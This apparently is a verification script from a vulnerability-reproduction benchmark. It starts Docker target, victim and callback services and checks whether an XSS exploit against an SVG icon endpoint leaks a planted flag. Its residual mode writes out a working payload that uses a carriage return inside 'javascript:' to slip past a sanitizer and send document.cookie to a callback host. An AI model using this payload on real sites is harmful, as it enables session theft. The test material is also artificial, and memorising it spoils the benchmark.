#!/usr/bin/env bash
# verify.sh --seed|--residual
# seed     : CVE-2026-29183 static <a href="javascript:..."> (original_poc.py)
# residual : CVE-2026-31809 CR-in-scheme (inline java&#13;script:; NOT <animate>)
# Effect = callback /dump contains the CURRENT RUN_FLAG (victim cookie exfil).
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"

if [[ -f "$WORK_DIR/compose.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$WORK_DIR/compose.env"
  set +a
fi

_cport() {
  docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" \
    --profile "$VERSION" port "$1" "$2" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]'
}

PORT="$(_cport "$VERSION" 6806)"
VPORT="$(_cport victim 8070)"
CPORT2="$(_cport callback 9000)"
if [[ -z "$PORT" || -z "$VPORT" || -z "$CPORT2" ]]; then
  docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" \
    --profile "$VERSION" up -d >/dev/null 2>&1 || true
  sleep 2
  PORT="$(_cport "$VERSION" 6806)"
  VPORT="$(_cport victim 8070)"
  CPORT2="$(_cport callback 9000)"
fi
case "$VERSION" in
  v0) PORT="${PORT:-${PORT_V0_0:-}}";;
  v1) PORT="${PORT:-${PORT_V1_0:-}}";;
  v2) PORT="${PORT:-${PORT_V2_0:-}}";;
esac
VPORT="${VPORT:-${PORT_VICTIM_0:-}}"
CPORT2="${CPORT2:-${PORT_CALLBACK_0:-}}"
if [[ -z "$PORT" || -z "$VPORT" || -z "$CPORT2" ]]; then
  echo "verify: compose port+compose.env failed app=$PORT victim=$VPORT cb=$CPORT2" >&2
  exit 20
fi
export PCB_TARGET_PORT="$PORT" PCB_VICTIM_PORT="$VPORT" PCB_CALLBACK_PORT="$CPORT2"
export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"

READY=0
for _ in $(seq 1 60); do
  acode="$(curl -sS -o /dev/null -w '%{http_code}' --max-time 5 \
    "http://127.0.0.1:${PORT}/api/icon/getDynamicIcon?type=8&content=ok" || true)"
  vhealth="$(curl -sS --max-time 5 "http://127.0.0.1:${VPORT}/health" || true)"
  chealth="$(curl -sS -o /dev/null -w '%{http_code}' --max-time 5 "http://127.0.0.1:${CPORT2}/health" || true)"
  if [[ "$acode" == "200" && "$vhealth" == "ok" && "$chealth" == "200" ]]; then
    READY=1
    break
  fi
  # Restore the planted flag (compose.env), never the wrong/stale override.
  docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" \
    --profile "$VERSION" up -d >/dev/null 2>&1 || true
  sleep 3
done
[[ "$READY" == 1 ]] || { echo "verify: env not ready app=$PORT victim=$VPORT cb=$CPORT2" >&2; exit 20; }

if [[ "$MODE" == "--seed" ]]; then
  CAND="$("$PY" "$CASE_DIR/poc/original_poc.py" "$VERSION" 2>/dev/null || true)"
  CAND="${CAND:-"{}"}"
  CAND="$("$PY" -c "import json,sys
s = sys.argv[1]
try:
    json.loads(s)
    print(s)
except Exception:
    print(json.dumps({'path': s.strip(), 'to': s.strip(), 'payload': s.strip(), 'css': s.strip()}))" "$CAND")"
  printf '%s' "$CAND" > "$WORK_DIR/cand.json"
  OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
  echo "${OUT:0:500}"
  if grep -qF -- "$RUN_FLAG" <<<"$OUT"; then exit 0; else exit 10; fi
fi

# residual: GHSA-pmc9 Vector 3 — CR inside javascript: scheme. V1 SanitizeSVG
# HasPrefix(val, "javascript:") misses java\rscript: after HTML parse; browser
# strips CR per WHATWG. Inline literal (runtime must not depend on hidden files).
"$PY" - "$VERSION" > "$WORK_DIR/cand.json" <<'PYEOF'
import json, sys, urllib.parse
v = sys.argv[1]
base = {"v0": "http://v0:6806", "v1": "http://v1:6806", "v2": "http://v2:6806"}.get(v, "http://v1:6806")
payload = (
    "</text><a href=\"java&#13;script:location='http://callback:9000/c?f='+document.cookie\">"
    "<text x=\"256\" y=\"256\" font-size=\"60\">c</text></a><text>"
)
print(json.dumps({
    "target": base + "/api/icon/getDynamicIcon?type=8&color=blue&content=" + urllib.parse.quote(payload, safe=""),
    "origin": base,
}))
PYEOF
OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
echo "${OUT:0:500}"
if grep -qF -- "$RUN_FLAG" <<<"$OUT"; then exit 0; else exit 10; fi
